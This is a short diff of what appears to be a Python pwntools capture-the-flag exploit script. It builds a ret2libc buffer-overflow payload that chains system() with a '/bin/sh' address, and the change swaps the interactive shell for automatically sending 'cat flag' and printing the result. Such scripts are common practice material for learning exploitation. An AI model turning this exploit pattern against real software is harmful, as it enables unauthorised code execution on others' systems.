@@ -58,5 +58,10 @@ p.recvuntil('story!\n')
 payload2 = 'A'*0x30 + 'B'*4 + p32(system_addr) + p32(vuln_addr) + p32(binsh_addr)
 p.sendline(payload2)
 
-p.interactive()
+# p.interactive()
+# p.close()
+p.sendlineafter("ending!","cat flag")
+p.recvuntil("flag")
+flag = p.recvuntil('}')
+print flag
 p.close()
